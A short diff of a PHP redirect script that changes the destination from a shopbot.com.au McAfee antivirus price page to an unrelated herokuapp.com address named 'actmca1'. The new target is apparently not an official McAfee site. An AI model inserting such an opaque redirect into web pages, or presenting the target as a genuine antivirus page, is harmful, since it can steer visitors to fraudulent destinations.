@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.shopbot.com.au/mcafee-antivirus/price/australia/343863");
+header("Location: https://actmca1.herokuapp.com/");
 die();
 ?>
